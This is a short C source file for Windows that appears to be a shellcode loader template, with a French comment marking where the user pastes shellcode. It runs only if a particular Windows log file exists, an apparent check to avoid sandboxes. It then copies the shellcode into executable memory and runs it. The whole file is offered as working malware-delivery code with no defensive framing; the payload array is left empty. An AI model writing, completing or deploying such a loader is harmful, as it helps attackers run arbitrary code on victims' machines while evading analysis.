#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>


int main(int argc, char **argv){

	FILE *ExistenceFichier = fopen("C:\\WINDOWS\\WindowsUpdate.log", "r");
	if(ExistenceFichier != 0)
	{

	char shellcode[]={
// VOTRE SHELLCODE
	};

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

	return 1;

	}
}